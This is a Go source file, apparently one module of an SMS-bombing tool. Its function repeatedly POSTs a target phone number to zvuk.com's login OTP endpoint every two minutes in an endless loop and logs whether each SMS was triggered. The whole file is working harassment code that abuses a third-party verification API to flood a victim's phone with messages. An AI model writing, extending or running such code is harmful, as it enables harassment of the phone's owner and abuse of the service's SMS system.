package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func zvuk() {
	req := newreq()
	req.SetRequestURI("https://zvuk.com/api/tiny/get-otp?phone=%2B" + num + "&length=4&type=login")
	req.Header.SetMethod("POST")

	timeout := time.Minute * 2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"result": {"otp_length":`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
